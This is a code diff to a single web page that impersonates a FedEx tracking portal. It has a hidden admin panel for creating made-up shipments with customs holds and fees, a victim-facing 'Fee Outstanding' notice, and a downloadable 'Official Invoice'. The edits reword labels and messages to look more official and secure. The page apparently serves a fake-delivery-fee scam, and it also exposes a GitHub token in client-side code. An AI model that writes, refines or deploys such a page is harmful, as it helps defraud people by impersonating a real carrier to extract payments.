@@ -29,7 +29,7 @@
         
         #pay-box { display: none; margin-top: 20px; padding: 15px; background: #fff3cd; border-radius: 8px; color: #856404; border-left: 5px solid #ffc107; }
 
-        /* FULL SCREEN INVOICE - NO SCROLLING */
+        /* NO-SCROLL INVOICE OVERLAY */
         #invoice-overlay { 
             display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
             background: rgba(0,0,0,0.85); z-index: 10000; align-items: center; justify-content: center;
@@ -52,13 +52,13 @@
 
 <div class="nav">
     <div class="logo" onclick="openAdmin()">Fed<span style="color:var(--o)">ex</span></div>
-    <div style="font-size:11px; opacity:0.8;">Tracking Portal</div>
+    <div style="font-size:11px; opacity:0.8;">Secure Tracking</div>
 </div>
 
 <div class="wrapper">
     <div class="card" id="client-view">
-        <h2 style="margin:0 0 10px 0; color:var(--p)">Track Shipment</h2>
-        <input type="text" id="trackInput" placeholder="Enter Tracking ID">
+        <h2 style="margin:0 0 10px 0; color:var(--p)">Track Package</h2>
+        <input type="text" id="trackInput" placeholder="Tracking ID (e.g. FDX-5755)">
         <button class="btn btn-o" id="mainTrackBtn" onclick="handleTracking()">TRACK</button>
 
         <div id="result">
@@ -76,7 +76,7 @@
     </div>
 
     <div id="admin-panel">
-        <h3>Admin Console</h3>
+        <h3>Admin Panel</h3>
         <input type="text" id="a-code" placeholder="Tracking ID">
         <input type="text" id="a-name" placeholder="Client Name">
         <input type="text" id="a-origin" placeholder="Origin">
@@ -88,7 +88,7 @@
             <option value="Held at Customs">Held at Customs</option>
         </select>
         <input type="file" id="a-file" accept="image/*">
-        <button class="btn btn-o" onclick="saveToCloud()">SAVE DATA</button>
+        <button class="btn btn-o" onclick="saveToCloud()">SAVE SHIPMENT</button>
         <button class="btn" style="margin-top:10px; background:#444; color:white;" onclick="location.reload()">EXIT</button>
     </div>
 </div>
@@ -111,7 +111,7 @@
         </table>
         <div class="total-row">TOTAL: $<span id="inv-fee-total"></span></div>
         <div style="margin-top:15px; font-size:8px; color:#666; border-top:1px solid #eee; padding-top:8px;">
-            Notice: Settlement is required for final release. This is an official document.
+            Notice: Settlement is required for release. This is an official electronic document.
         </div>
     </div>
 </div>
@@ -125,13 +125,13 @@
 
     async function handleTracking() {
         const btn = document.getElementById('mainTrackBtn'), input = document.getElementById('trackInput').value;
-        if(!input) return; btn.innerText = "TRACKING...";
+        if(!input) return; btn.innerText = "SEARCHING...";
         setTimeout(async () => { await startTracking(input); btn.innerText = "TRACK"; }, 2000);
     }
 
     async function startTracking(input) {
         const res = await fetch(`https://api.github.com/repos/${U}/${R}/contents/data.json?v=${Date.now()}`, { headers: { "Authorization": `token ${KEY}` } });
-        if(!res.ok) return alert("No shipments found yet.");
+        if(!res.ok) return alert("System database not initialized. Add a shipment first.");
         const file = await res.json(); const data = JSON.parse(atob(file.content)); const s = data[input];
         if(s) {
             document.getElementById('result').style.display = 'block';
@@ -143,28 +143,28 @@
             if(s.img){ document.getElementById('r-img').src = s.img; document.getElementById('r-img').style.display='block'; }
             if(s.status.includes("Arrived") || s.status.includes("Clearance")) {
                 document.getElementById('pay-box').style.display='block';
-                document.getElementById('pay-msg').innerHTML = `<b>Fee Required:</b> $${s.fee}`;
+                document.getElementById('pay-msg').innerHTML = `<b>Fee Outstanding:</b> $${s.fee}`;
                 document.getElementById('inv-code').innerText = input;
                 document.getElementById('inv-name').innerText = s.name;
                 document.getElementById('inv-fee').innerText = s.fee;
                 document.getElementById('inv-fee-total').innerText = s.fee;
                 document.getElementById('inv-date').innerText = s.date;
             }
-        } else alert("Invalid ID");
+        } else alert("Tracking ID not found.");
     }
 
     function previewAndDownload() {
         document.getElementById('invoice-overlay').style.display='flex';
         setTimeout(() => {
             html2canvas(document.getElementById('invoice-capture'), { scale: 3 }).then(canvas => {
-                const link = document.createElement('a'); link.download = 'FedEx_Invoice.png'; link.href = canvas.toDataURL(); link.click();
+                const link = document.createElement('a'); link.download = 'Official_Invoice.png'; link.href = canvas.toDataURL(); link.click();
             });
-        }, 1000);
+        }, 1200);
     }
 
     async function saveToCloud() {
-        const id = document.getElementById('a-code').value;
-        const fileInput = document.getElementById('a-file').files[0];
+        const id = document.getElementById('a-code').value, fileInput = document.getElementById('a-file').files[0];
+        if(!id) return alert("Enter Tracking ID");
         let imgBase64 = "";
         if(fileInput) imgBase64 = await new Promise(r => { const reader = new FileReader(); reader.onload = () => r(reader.result); reader.readAsDataURL(fileInput); });
         const payload = {
@@ -178,9 +178,8 @@
         if(check.ok) { const existing = await check.json(); db = JSON.parse(atob(existing.content)); sha = existing.sha; }
         db[id] = payload;
         await fetch(url, { method: "PUT", headers: { "Authorization": `token ${KEY}` }, body: JSON.stringify({ message: "Update", content: btoa(unescape(encodeURIComponent(JSON.stringify(db, null, 2)))), sha: sha }) });
-        alert("Shipment Saved!"); location.reload();
+        alert("Shipment Saved! You can now track it."); location.reload();
     }
 </script>
 </body>
-              </html>
-              
+</html>
